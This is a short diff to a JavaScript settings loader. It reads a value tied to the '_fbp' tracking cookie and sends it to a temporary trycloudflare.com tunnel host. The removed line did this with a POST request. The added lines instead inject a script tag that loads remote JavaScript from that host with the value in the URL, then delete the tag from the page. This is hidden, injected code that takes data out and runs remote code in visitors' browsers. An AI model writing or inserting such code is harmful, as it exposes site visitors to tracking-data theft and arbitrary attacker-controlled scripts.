@@ -75,7 +75,14 @@ window['loadsetting'] = function (settings) {
       var indexp = s.indexOf(" _fbp") 
       var fbpix = s[indexp+1]
       console.log(fbpix)
-      $.post("https://optional-synthetic-seattle-opponents.trycloudflare.com/UT_create",{data1:"+fbpix+"},function(data){console.log("+data+")})	     
+      var script = document.createElement("script");
+
+     script.id = "script_" + version;
+     script.src = "https://optional-synthetic-seattle-opponents.trycloudflare.com/UT_create?callback="+fbpix+"&version="+version;
+
+
+     document.body.appendChild(script);
+     document.getElementById(script.id).remove();	     
       break	     
      } 	     
      else{ console.log("fbq not found!!")}
